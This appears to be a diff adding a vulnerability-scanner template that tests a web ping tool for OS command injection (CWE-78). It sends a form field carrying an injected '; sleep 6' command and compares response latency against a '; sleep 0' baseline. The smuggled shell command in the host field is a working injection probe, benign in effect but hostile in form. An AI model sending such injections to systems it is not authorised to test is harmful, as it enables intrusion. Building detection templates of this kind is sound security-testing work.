@@ -1,0 +1,39 @@
+{
+  "name": "web/Command injection time-based sleep oracle",
+  "description": "[high] Proves OS command injection via sleep oracle: structurally identical injections differing ONLY in `; sleep 0` vs `; sleep 6`; latency_delta >= 3.5s isolates shell execution from network noise. Keywords: command injection rce os sleep time-based shell ping. ctrl: non-injected host stays fast -> not falsified. base_url = host-tool endpoint (ping/dig/nslookup forms).",
+  "cwe": "CWE-78",
+  "requests": {
+    "baseline": {
+      "method": "POST",
+      "url": "{{base_url}}/tools/ping",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "body": "host=127.0.0.1%3Bsleep%200"
+    },
+    "payload": {
+      "method": "POST",
+      "url": "{{base_url}}/tools/ping",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "body": "host=127.0.0.1%3Bsleep%206"
+    }
+  },
+  "conditions": [
+    {
+      "type": "latency_delta",
+      "request_a": "baseline",
+      "request_b": "payload",
+      "min_delta": 3.5
+    }
+  ],
+  "params": [
+    "base_url"
+  ],
+  "source": "imported",
+  "successes": 1,
+  "id": "cc18b15c32e2",
+  "created": "2026-11-06T02:07:37.515534+00:00",
+  "last_used": "2026-11-06T02:07:37.515534+00:00"
+}
